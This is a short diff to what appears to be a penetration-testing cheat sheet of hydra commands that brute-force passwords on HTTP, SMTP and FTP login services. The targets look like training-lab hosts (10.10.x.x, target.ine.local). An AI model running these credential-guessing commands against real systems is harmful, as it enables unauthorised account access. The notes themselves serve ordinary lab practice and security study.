@@ -11,3 +11,6 @@ sudo hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credential
 
 # SMTP
 sudo hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v 
+
+# FTP
+hydra -l ashley -P unix_passwords.txt ftp://target.ine.local -s 5554 
